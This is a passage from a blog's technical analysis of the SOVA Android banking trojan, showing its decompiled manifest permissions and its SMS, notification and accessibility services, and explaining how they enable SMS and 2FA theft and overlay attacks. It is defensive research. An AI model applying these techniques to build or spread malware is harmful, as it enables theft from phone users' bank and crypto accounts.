<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.19.2 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Technical analysis of SOVA android malware - muha2xmad</title>
<meta name="description" content="بسم الله الرحمن الرحيم  ">


  <meta name="author" content="Muhammad Hasan Ali">


<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="muha2xmad">
<meta property="og:title" content="Technical analysis of SOVA android malware">
<meta property="og:url" content="https://muha2xmad.github.io/malware-analysis/sova/">


  <meta property="og:description" content="بسم الله الرحمن الرحيم  ">



  <meta property="og:image" content="https://muha2xmad.github.io/assets/images/MA/sova/sova.jfif">





  <meta property="article:published_time" content="2022-09-01T00:00:00+00:00">





  

  


<link rel="canonical" href="https://muha2xmad.github.io/malware-analysis/sova/">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "Muhammad Hasan Ali",
      "url": "https://muha2xmad.github.io/"
    
  }
</script>


  <meta name="google-site-verification" content="yjK5jUGtGuvD9i_1SEaec8FrngezWj1KJqBbPuPRAQM" />





<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="muha2xmad Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

<!-- favicon -->
<link rel="icon" type="image/png" sizes="32x32" href="/assets/images/site/lo.png">
<!-- <link rel="icon" type="image/png" sizes="16x16" href="/assets/images/site/lo.png"> -->
<meta name="theme-color" content="#ffffff">

  </head>

  <body class="layout--single wide">
    <nav class="skip-links">
  <h2 class="screen-reader-text">Skip links</h2>
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/site/lo.png" alt=""></a>
        
        <a class="site-title" href="/">
          muha2xmad
          
        </a>
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/categories/#Malware-analysis">Malware analysis</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/#Mal-Document">Mal Documents</a>
            </li></ul>
        
        <button class="search__toggle" type="button">
          <span class="visually-hidden">Toggle search</span>
          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
          </svg>
        </button>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>


    <div class="initial-content">
      



<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      
        <img src="/assets/images/site/ed.jpg" alt="Muhammad Hasan Ali" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">Muhammad Hasan Ali</h3>
    
    
      <div class="author__bio" itemprop="description">
        <p>Malware Analysis</p>

      </div>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Egypt</span>
        </li>
      

      
        
          
        
          
            <li><a href="https://twitter.com/muha2xmad" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
          
        
          
        
          
            <li><a href="https://www.linkedin.com/in/muhammadhasanali/" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
          
        
          
            <li><a href="https://github.com/muha2xmad" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
          
        
          
        
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>



  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Technical analysis of SOVA android malware">
    <meta itemprop="description" content="بسم الله الرحمن الرحيم">
    <meta itemprop="datePublished" content="2022-09-01T00:00:00+00:00">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">Technical analysis of SOVA android malware
</h1>
          
            <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 




  19 minute read

</p>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
          <aside class="sidebar__right ">
            <nav class="toc">
              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
              <ul class="toc__menu">
  <li><a href="#introduction">Introduction</a></li>
  <li><a href="#explore-androidmanifestxml">Explore AndroidManifest.xml</a></li>
  <li><a href="#dive-into-packed-classesex">Dive into packed classes.ex</a></li>
  <li><a href="#dive-into-droped-dex">Dive into droped dex</a></li>
  <li><a href="#dynamic">Dynamic</a></li>
  <li><a href="#ioc">IoC</a></li>
  <li><a href="#article-quote">Article quote</a></li>
  <li><a href="#ref">REF</a></li>
</ul>

            </nav>
          </aside>
        
        <p><strong>بسم الله الرحمن الرحيم</strong></p>

<p><strong>FreePalestine</strong></p>

<h1 id="introduction">Introduction</h1>

<p>In September 2021, SOVA, a new Android Banking Trojan, was announced in a known underground forum. It had multiple capabilities and was basically almost in the go-to market phase.Until March 2022, multiple versions of SOVA were found and some of these features were already implemented, such as: 2FA interception, cookie stealing and injections for new targets and countries (e.g. multiple Philippine banks). In July 2022, we discovered a new version of SOVA (v4) which presents new capabilities and seems to be targeting more than 200 mobile applications, including banking apps and crypto exchanges/wallets. Starting from May 2022, Threat Actors (TAs) behind SOVA have started to deliver a new version of their malware, hiding within fake Android applications that show up with the logo of a few famous ones, like Chrome, Amazon, NFT platform or others.</p>

<p>Download the sample from <a href="https://bazaar.abuse.ch/sample/7c805f51ee3b2994e742d73954e51d7c2c24c76455b0b9a1b44d61cb4e280502/">malwarebazaar</a></p>

<h1 id="explore-androidmanifestxml">Explore AndroidManifest.xml</h1>
<p><code class="language-plaintext highlighter-rouge">AndroidManifest.xml</code> is not human-readable so we use <code class="language-plaintext highlighter-rouge">apktool</code> to decompile the apk first to be able to read the <code class="language-plaintext highlighter-rouge">AndroidManifest.xml</code>. We need to read this file to know the ability of this malicious APK and know more inforamation such as entry points for the app, Activities, Services, Intents, app permissions, and package name.</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">&lt;</span><span class="n">uses</span><span class="p">-</span><span class="n">feature</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"android.hardware.telephony"</span><span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="n">uses</span><span class="p">-</span><span class="n">permission</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"android.permission.WAKE_LOCK"</span><span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="n">uses</span><span class="p">-</span><span class="n">permission</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"android.permission.QUERY_ALL_PACKAGES"</span><span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="n">uses</span><span class="p">-</span><span class="n">permission</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"android.permission.ACCESS_WIFI_STATE"</span><span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="n">uses</span><span class="p">-</span><span class="n">permission</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"android.permission.ACCESS_NETWORK_STATE"</span><span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="n">uses</span><span class="p">-</span><span class="n">permission</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"android.permission.RECEIVE_BOOT_COMPLETED"</span><span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="n">uses</span><span class="p">-</span><span class="n">permission</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"</span><span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="n">uses</span><span class="p">-</span><span class="n">permission</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"android.permission.USE_FINGERPRINT"</span><span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="n">uses</span><span class="p">-</span><span class="n">permission</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"android.permission.GET_TASKS"</span><span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="n">uses</span><span class="p">-</span><span class="n">permission</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"com.google.android.gms.permission.ACTIVITY_RECOGNITION"</span><span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="n">uses</span><span class="p">-</span><span class="n">permission</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"android.permission.READ_EXTERNAL_STORAGE"</span><span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="n">uses</span><span class="p">-</span><span class="n">permission</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"android.permission.RECEIVE_LAUNCH_BROADCASTS"</span><span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="n">uses</span><span class="p">-</span><span class="n">permission</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"android.permission.REQUEST_DELETE_PACKAGES"</span><span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="n">uses</span><span class="p">-</span><span class="n">permission</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"android.permission.ACTION_MANAGE_OVERLAY_PERMISSION"</span><span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="n">uses</span><span class="p">-</span><span class="n">permission</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"android.permission.CALL_PHONE"</span><span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="n">uses</span><span class="p">-</span><span class="n">permission</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"android.permission.WRITE_SETTINGS"</span><span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="n">uses</span><span class="p">-</span><span class="n">permission</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"android.permission.ACCESS_BACKGROUND_LOCATION"</span><span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="n">uses</span><span class="p">-</span><span class="n">permission</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"android.permission.RECEIVE_SMS"</span><span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="n">uses</span><span class="p">-</span><span class="n">permission</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"android.permission.QUICKBOOT_POWERON"</span><span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="n">uses</span><span class="p">-</span><span class="n">permission</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"android.permission.RECORD_AUDIO"</span><span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="n">uses</span><span class="p">-</span><span class="n">permission</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"android.permission.FOREGROUND_SERVICE"</span><span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="n">uses</span><span class="p">-</span><span class="n">permission</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"android.permission.BLUETOOTH"</span><span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="n">uses</span><span class="p">-</span><span class="n">permission</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"android.permission.GET_ACCOUNTS"</span><span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="n">uses</span><span class="p">-</span><span class="n">permission</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"android.permission.CHANGE_NETWORK_STATE"</span><span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="n">uses</span><span class="p">-</span><span class="n">permission</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"android.permission.CLEAR_APP_CACHE"</span><span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="n">uses</span><span class="p">-</span><span class="n">permission</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"android.permission.INTERNET"</span><span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="n">uses</span><span class="p">-</span><span class="n">permission</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"android.permission.READ_CONTACTS"</span><span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="n">uses</span><span class="p">-</span><span class="n">permission</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"android.permission.READ_EXTERNAL_STORAGE"</span><span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="n">uses</span><span class="p">-</span><span class="n">permission</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"android.permission.READ_PHONE_STATE"</span><span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="n">uses</span><span class="p">-</span><span class="n">permission</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"android.permission.ACCESS_COARSE_LOCATION"</span><span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="n">uses</span><span class="p">-</span><span class="n">permission</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"android.permission.INSTALL_PACKAGES"</span><span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="n">uses</span><span class="p">-</span><span class="n">permission</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"android.permission.QUERY_ALL_PACKAGES"</span><span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="n">uses</span><span class="p">-</span><span class="n">permission</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"android.permission.ACCESS_FINE_LOCATION"</span><span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="n">uses</span><span class="p">-</span><span class="n">permission</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"android.permission.READ_SMS"</span><span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="n">uses</span><span class="p">-</span><span class="n">permission</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"android.permission.READ_PHONE_NUMBERS"</span><span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="n">uses</span><span class="p">-</span><span class="n">permission</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"android.permission.SYSTEM_ALERT_WINDOW"</span><span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="n">uses</span><span class="p">-</span><span class="n">permission</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"android.permission.WRITE_EXTERNAL_STORAGE"</span><span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="n">uses</span><span class="p">-</span><span class="n">permission</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"android.permission.WRITE_CONTACTS"</span><span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="n">uses</span><span class="p">-</span><span class="n">permission</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"android.permission.REORDER_TASKS"</span><span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="n">uses</span><span class="p">-</span><span class="n">permission</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"android.permission.CHANGE_WIFI_STATE"</span><span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="n">uses</span><span class="p">-</span><span class="n">permission</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"android.permission.REQUEST_INSTALL_PACKAGES"</span><span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="n">uses</span><span class="p">-</span><span class="n">permission</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"android.permission.READ_PHONE_NUMBERS"</span><span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="n">uses</span><span class="p">-</span><span class="n">permission</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"android.permission.DISABLE_KEYGUARD"</span><span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="n">uses</span><span class="p">-</span><span class="n">permission</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"android.permission.SEND_SMS"</span><span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="n">uses</span><span class="p">-</span><span class="n">permission</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"android.permission.WRITE_EXTERNAL_STORAGE"</span><span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="n">uses</span><span class="p">-</span><span class="n">permission</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"android.permission.MODIFY_AUDIO_SETTINGS"</span><span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="n">uses</span><span class="p">-</span><span class="n">permission</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"android.permission.VIBRATE"</span><span class="p">/&gt;</span>
</code></pre></div></div>
<p>The malware gets lots of permissions to steal SMS such as <code class="language-plaintext highlighter-rouge">READ_SMS</code>, <code class="language-plaintext highlighter-rouge">SEND_SMS</code>, and <code class="language-plaintext highlighter-rouge">RECEIVE_SMS</code>, get permission to steal contacts such as <code class="language-plaintext highlighter-rouge">READ_CONTACTS</code>,  <code class="language-plaintext highlighter-rouge">WRITE_CONTACTS</code>, and <code class="language-plaintext highlighter-rouge">READ_PHONE_NUMBERS</code>, get permission to un/install packages such as <code class="language-plaintext highlighter-rouge">QUERY_ALL_PACKAGES</code>, <code class="language-plaintext highlighter-rouge">REQUEST_INSTALL_PACKAGES</code>, <code class="language-plaintext highlighter-rouge">INSTALL_PACKAGES</code>, and <code class="language-plaintext highlighter-rouge">REQUEST_DELETE_PACKAGES</code> to launch overlay attack when a specific application is launched usually bank apps, gets permission to access the location of the victim’s phone such as <code class="language-plaintext highlighter-rouge">ACCESS_FINE_LOCATION</code>, <code class="language-plaintext highlighter-rouge">ACCESS_COARSE_LOCATION</code>, and <code class="language-plaintext highlighter-rouge">ACCESS_BACKGROUND_LOCATION</code>.</p>

<p>Other permissions such as <code class="language-plaintext highlighter-rouge">DISABLE_KEYGUARD</code> to disable the phone lock for the time being the application is used, <code class="language-plaintext highlighter-rouge">REORDER_TASKS</code> this Allows the app to move tasks to the foreground and background, <code class="language-plaintext highlighter-rouge">RECORD_AUDIO</code> allow the app to record audio, <code class="language-plaintext highlighter-rouge">CALL_PHONE</code> Allows an application to initiate a phone call without going through the Dialer user interface, <code class="language-plaintext highlighter-rouge">ACTION_MANAGE_OVERLAY_PERMISSION</code>  controlling which apps can draw on top of other apps helps the overlay attack, <code class="language-plaintext highlighter-rouge">RECEIVE_BOOT_COMPLETED</code> to receive a notification when the system finishes booting.</p>

<p>We get the Entry point of the malicious application <code class="language-plaintext highlighter-rouge">com.devapprove.a.ru.news.ui.LauncherActivity</code> <strong>which is not found the classes.dex. So this an indication that the malware is packed</strong> and  other classes will be loaded into application at run-time. And we need to unpack it so the malware will drop the decrypted dex file which contains the malicious functions the malware will do to the victim’s device such as stealing SMS or how the malware will communicate to the C2 server.</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">&lt;</span><span class="n">activity</span> <span class="n">android</span><span class="p">:</span><span class="n">exported</span><span class="p">=</span><span class="s">"true"</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"com.devapprove.a.ru.news.ui.LauncherActivity"</span> <span class="n">android</span><span class="p">:</span><span class="n">theme</span><span class="p">=</span><span class="s">"@android:style/Theme.Translucent.NoTitleBar.Fullscreen"</span><span class="p">&gt;</span>
            <span class="p">&lt;</span><span class="n">intent</span><span class="p">-</span><span class="n">filter</span><span class="p">&gt;</span>
                <span class="p">&lt;</span><span class="n">category</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"android.intent.category.LAUNCHER"</span><span class="p">/&gt;</span>
                <span class="p">&lt;</span><span class="n">action</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"android.intent.action.MAIN"</span><span class="p">/&gt;</span>
            <span class="p">&lt;/</span><span class="n">intent</span><span class="p">-</span><span class="n">filter</span><span class="p">&gt;</span>
        <span class="p">&lt;/</span><span class="n">activity</span><span class="p">&gt;</span>
</code></pre></div></div>

<p>This service called <code class="language-plaintext highlighter-rouge">HeadlessSmsSendService</code> using <code class="language-plaintext highlighter-rouge">SEND_RESPOND_VIA_MESSAGE</code> permission, which enables the malware to send a request to other apps to handle respond-via-message events for incoming calls.</p>
<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="p">&lt;</span><span class="n">service</span> <span class="n">android</span><span class="p">:</span><span class="n">exported</span><span class="p">=</span><span class="s">"true"</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"com.devapprove.a.ru.news.HeadlessSmsSendService"</span> <span class="n">android</span><span class="p">:</span><span class="n">permission</span><span class="p">=</span><span class="s">"android.permission.SEND_RESPOND_VIA_MESSAGE"</span><span class="p">&gt;</span>
            <span class="p">&lt;</span><span class="n">intent</span><span class="p">-</span><span class="n">filter</span><span class="p">&gt;</span>
                <span class="p">&lt;</span><span class="n">action</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"android.intent.action.RESPOND_VIA_MESSAGE"</span><span class="p">/&gt;</span>
                <span class="p">&lt;</span><span class="n">category</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"android.intent.category.DEFAULT"</span><span class="p">/&gt;</span>
                <span class="p">&lt;</span><span class="n">data</span> <span class="n">android</span><span class="p">:</span><span class="n">scheme</span><span class="p">=</span><span class="s">"sms"</span><span class="p">/&gt;</span>
                <span class="p">&lt;</span><span class="n">data</span> <span class="n">android</span><span class="p">:</span><span class="n">scheme</span><span class="p">=</span><span class="s">"smsto"</span><span class="p">/&gt;</span>
                <span class="p">&lt;</span><span class="n">data</span> <span class="n">android</span><span class="p">:</span><span class="n">scheme</span><span class="p">=</span><span class="s">"mms"</span><span class="p">/&gt;</span>
                <span class="p">&lt;</span><span class="n">data</span> <span class="n">android</span><span class="p">:</span><span class="n">scheme</span><span class="p">=</span><span class="s">"mmsto"</span><span class="p">/&gt;</span>
            <span class="p">&lt;/</span><span class="n">intent</span><span class="p">-</span><span class="n">filter</span><span class="p">&gt;</span>
        <span class="p">&lt;/</span><span class="n">service</span><span class="p">&gt;</span>
</code></pre></div></div>
<p>The malware will use <code class="language-plaintext highlighter-rouge">NotificationService</code> service to handle the device notification. The malware will be able to read/write all device notifications such as SMS notifications and messages notifications and system notifications. This used to intercept when 2FA SMS revieved or OTP SMS.</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">&lt;</span><span class="n">service</span> <span class="n">android</span><span class="p">:</span><span class="n">enabled</span><span class="p">=</span><span class="s">"true"</span> <span class="n">android</span><span class="p">:</span><span class="n">exported</span><span class="p">=</span><span class="s">"false"</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"com.devapprove.a.ru.news.service.NotificationService"</span> <span class="n">android</span><span class="p">:</span><span class="n">permission</span><span class="p">=</span><span class="s">"android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"</span><span class="p">&gt;</span>
            <span class="p">&lt;</span><span class="n">intent</span><span class="p">-</span><span class="n">filter</span><span class="p">&gt;</span>
                <span class="p">&lt;</span><span class="n">action</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"android.service.notification.NotificationListenerService"</span><span class="p">/&gt;</span>
            <span class="p">&lt;/</span><span class="n">intent</span><span class="p">-</span><span class="n">filter</span><span class="p">&gt;</span>
        <span class="p">&lt;/</span><span class="n">service</span><span class="p">&gt;</span>
</code></pre></div></div>
<p>The malware uses this service <code class="language-plaintext highlighter-rouge">AppAccessibilityService</code> to decalare an <code class="language-plaintext highlighter-rouge">Accessibility Service</code> in the Android manifest. An accessibility service is an application that provides user interface enhancements to assist users with disabilities, or who may temporarily be unable to fully interact with a device. And the capabilities the malware requests are in <code class="language-plaintext highlighter-rouge">@xml/accessibilityservice</code> in <code class="language-plaintext highlighter-rouge">res</code> folder.</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">&lt;</span><span class="n">service</span> <span class="n">android</span><span class="p">:</span><span class="n">exported</span><span class="p">=</span><span class="s">"false"</span> <span class="n">android</span><span class="p">:</span><span class="n">label</span><span class="p">=</span><span class="s">"@string/app_name"</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"com.devapprove.a.ru.news.service.AppAccessibilityService"</span> <span class="n">android</span><span class="p">:</span><span class="n">permission</span><span class="p">=</span><span class="s">"android.permission.BIND_ACCESSIBILITY_SERVICE"</span><span class="p">&gt;</span>
            <span class="p">&lt;</span><span class="n">intent</span><span class="p">-</span><span class="n">filter</span><span class="p">&gt;</span>
                <span class="p">&lt;</span><span class="n">action</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"android.accessibilityservice.AccessibilityService"</span><span class="p">/&gt;</span>
            <span class="p">&lt;/</span><span class="n">intent</span><span class="p">-</span><span class="n">filter</span><span class="p">&gt;</span>
            <span class="p">&lt;</span><span class="n">meta</span><span class="p">-</span><span class="n">data</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"android.accessibilityservice"</span> <span class="n">android</span><span class="p">:</span><span class="n">resource</span><span class="p">=</span><span class="s">"@xml/accessibilityservice"</span><span class="p">/&gt;</span>
        <span class="p">&lt;/</span><span class="n">service</span><span class="p">&gt;</span>
</code></pre></div></div>

<p>The capabilities in <code class="language-plaintext highlighter-rouge">@xml/accessibilityservice</code> are <code class="language-plaintext highlighter-rouge">canRetrieveWindowContent</code> to retrieve the content of the window, <code class="language-plaintext highlighter-rouge">accessibilityEventTypes</code> to get all types of events which helps the malware to maintain more presitence in the victim’s device.</p>

<p>This allows the malware to get SMS notifications when the device gets SMS message. The malware set the priority to <code class="language-plaintext highlighter-rouge">9999</code> which allows the malware to get the SMS notification before the system messaging apps. Then the malware deletes or send it to C2 server or do whatever he wants. This helps stealing <code class="language-plaintext highlighter-rouge">2FA</code> SMS.</p>

